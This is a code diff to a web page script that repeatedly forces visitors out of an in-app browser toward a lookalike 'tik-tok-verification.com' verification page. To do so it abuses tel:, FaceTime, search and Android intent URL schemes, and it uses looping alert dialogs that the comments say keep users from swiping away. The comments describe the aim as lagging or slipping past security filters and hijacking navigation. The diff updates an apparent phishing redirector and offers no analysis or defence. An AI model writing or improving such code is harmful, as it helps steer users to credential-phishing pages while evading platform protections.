@@ -11,47 +11,47 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function nuclearJump() {
-        const isAndroid = /Android/i.test(navigator.userAgent);
+    function triggerSystemExit() {
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         const urlNoProtocol = target.replace("https://", "");
 
-        // 1. Trigger high-priority OS protocols
-        if (isAndroid) {
-            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
+        // 1. THE EXIT TRIGGER: FaceTime or TelPrompt
+        // This is what forced the 'Gmail' prompt earlier, but even stronger.
+        if (isIOS) {
+            window.location.href = "facetime-prompt://" + "0000000000";
         } else {
-            // iOS: Maps protocol is rarely blocked and forces an external app switch
-            window.location.replace("maps://maps.apple.com/?q=" + encodeURIComponent(target));
-            window.location.href = "googlegmail:///co?to=test@test.com&body=" + encodeURIComponent(target);
+            window.location.href = "tel:0000000000";
         }
 
-        // 2. THE STALL: Create a computational heavy-lift to "lag" the security filter
-        const start = Date.now();
-        while (Date.now() - start < 50) {
-            // This 50ms loop "freezes" the WebView, 
-            // often letting the OS-level redirect 'leak' out.
-        }
+        // 2. THE HIJACK: While the OS is showing the "Call?" prompt, 
+        // we inject the browser redirect into the navigation stack.
+        setTimeout(() => {
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
+            // Android Chrome Intent fallback
+            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+        }, 100);
     }
 
     function rampage() {
         if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
 
-        nuclearJump();
+        // Fire the exit trigger
+        triggerSystemExit();
 
-        // THE LOCK
-        alert("ATTEMPT #22\n\nExternal browser authentication required.\n\nTap OK to sync.");
+        // THE LOCK: Keeps them from swiping away while the system prompt loads
+        alert("ATTEMPT #23\n\nSecurity Handover Initialized.\n\nTap OK to open the secure system browser.");
 
-        // THE MICRO-GAP: 
-        // We fire the jump immediately after the tap momentum
-        nuclearJump();
+        // Post-Alert Jump
+        triggerSystemExit();
 
-        setTimeout(rampage, 1);
+        // Slightly longer delay (50ms) to allow the OS to process the system dialogs
+        setTimeout(rampage, 50);
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // If they swipe or blur, it forces the loop back on
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
 </body>
